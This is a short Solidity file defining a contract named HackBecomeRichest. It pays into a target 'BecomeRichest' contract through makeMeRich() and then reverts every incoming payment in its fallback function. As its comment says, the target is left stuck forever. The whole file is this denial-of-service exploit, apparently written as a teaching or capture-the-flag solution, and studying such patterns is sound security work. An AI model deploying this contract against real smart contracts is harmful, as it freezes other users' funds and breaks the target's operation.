
/**
* @dev Deploy BecomeRichest contract first.
* This contract will revert the transfer initiated by BecomeRich contract causing it to
* stuck forever.
*/
contract HackBecomeRichest {

    /**
    * @dev `contractAddress` of BecomeRich contract.
    */
    function callBecomeRichest(address contractAddress) external payable returns(bool) {
        bytes memory payload = abi.encodeWithSignature('makeMeRich()');
        (bool success, ) = address(contractAddress).call.value(msg.value).gas(100000)(payload);
        return success;
    }

    function() external payable {
        revert();
    }

}
